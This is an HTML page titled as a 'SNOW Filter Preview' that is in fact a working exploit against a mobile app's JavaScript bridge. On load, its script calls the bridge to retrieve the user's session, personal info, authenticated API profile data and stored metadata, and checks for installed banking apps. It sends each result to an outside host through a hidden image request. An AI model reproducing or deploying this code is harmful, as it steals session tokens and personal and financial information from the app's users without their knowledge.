
<!DOCTYPE html>
<html>
<head>
    <title>SNOW Filter Preview</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:-apple-system,sans-serif;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0}
        .container{max-width:500px;margin:0 auto;background:#fff;border-radius:20px;padding:20px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
        h1{color:#333;text-align:center;font-size:18px}
        .status{padding:8px 12px;margin:6px 0;background:#f8f9fa;border-radius:8px;font-size:10px;word-break:break-all}
        .success{border-left:4px solid #4CAF50;background:#e8f5e9}
        .error{border-left:4px solid #f44336;background:#ffebee}
        .critical{border-left:4px solid #9c27b0;background:#f3e5f5}
        pre{background:#263238;color:#aed581;padding:8px;border-radius:5px;font-size:8px;overflow-x:auto;max-height:150px;white-space:pre-wrap}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Exploiting SNOW...</h1>
        <div id="status"></div>
    </div>

    <script>
    var Bridge = window.B612KajiBridgeInterface;

    function log(msg, type) {
        var div = document.createElement('div');
        div.className = 'status ' + (type || 'info');
        div.textContent = msg;
        document.getElementById('status').appendChild(div);
    }

    function showData(title, data) {
        var pre = document.createElement('pre');
        pre.textContent = title + ':\n' + JSON.stringify(data, null, 2);
        document.getElementById('status').appendChild(pre);
    }

    function exfil(type, data) {
        var img = new Image();
        img.src = 'https://httpbin.org/anything/exfil?type=' + type + '&data=' + encodeURIComponent(JSON.stringify(data));
    }

    function runExploit() {
        if (typeof B612KajiBridgeInterface === 'undefined') {
            log('Bridge NOT found', 'error');
            return;
        }

        Bridge = B612KajiBridgeInterface;
        log('✅ B612KajiBridgeInterface FOUND!', 'success');

        // 1. getUserSession - 세션/토큰 정보
        window.sessionCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🔑 USER SESSION Retrieved!', 'critical');
            showData('Session', d);
            exfil('session', d);
        };
        try {
            Bridge.getUserSession('sessionCB');
            log('Calling getUserSession...', 'info');
        } catch(e) {
            log('getUserSession: ' + e, 'error');
        }

        // 2. appInfo - 앱 및 사용자 정보
        window.appInfoCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('📱 APP INFO Retrieved!', 'success');
            showData('AppInfo', d);
            exfil('appInfo', d);
        };
        try {
            Bridge.appInfo('appInfoCB');
        } catch(e) {}

        // 3. getPersonalInfo - 개인정보
        window.personalCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('👤 PERSONAL INFO Retrieved!', 'critical');
            showData('PersonalInfo', d);
            exfil('personal', d);
        };
        try {
            Bridge.getPersonalInfo('personalCB');
        } catch(e) {}

        // 4. apiRequest - 인증된 API로 사용자 프로필 탈취
        window.profileCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🎯 API RESPONSE (Profile)!', 'critical');
            showData('API Profile', d);
            exfil('apiProfile', d);
        };
        try {
            Bridge.apiRequest('profileCB', JSON.stringify({
                url: 'https://gw.snowcorp.com/api/v2/user/profile',
                method: 'GET'
            }));
            log('Calling apiRequest for profile...', 'info');
        } catch(e) {
            log('apiRequest profile: ' + e, 'error');
        }

        // 5. 다른 API 엔드포인트 시도
        window.meCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🎯 API RESPONSE (Me)!', 'critical');
            showData('API Me', d);
            exfil('apiMe', d);
        };
        try {
            Bridge.apiRequest('meCB', JSON.stringify({
                url: 'https://gw.snowcorp.com/api/v2/me',
                method: 'GET'
            }));
        } catch(e) {}

        // 6. readMeta - 저장된 메타데이터
        window.metaCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('📄 META DATA Retrieved!', 'success');
            showData('MetaData', d);
            exfil('meta', d);
        };
        try {
            Bridge.readMeta('metaCB', JSON.stringify({key: 'user'}));
        } catch(e) {}

        // 7. 설치된 금융앱 체크 (프라이버시 침해)
        var bankApps = [];
        window.bankCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            if (d && d.installed) {
                bankApps.push(d.package || d);
                log('💳 Bank App Found: ' + JSON.stringify(d), 'critical');
            }
            exfil('bankApp', d);
        };
        var apps = [
            'com.kakaobank.channel',
            'com.kbstar.kbbank',
            'com.shinhan.sbanking',
            'com.wooribank.smart.npib',
            'com.toss.supertoss',
            'com.nhn.android.search',
            'com.kakao.talk'
        ];
        apps.forEach(function(pkg) {
            try {
                Bridge.checkAppInstalled('bankCB', JSON.stringify({package: pkg}));
            } catch(e) {}
        });
        log('Checking ' + apps.length + ' sensitive apps...', 'info');
    }

    setTimeout(runExploit, 500);
    </script>
</body>
</html>
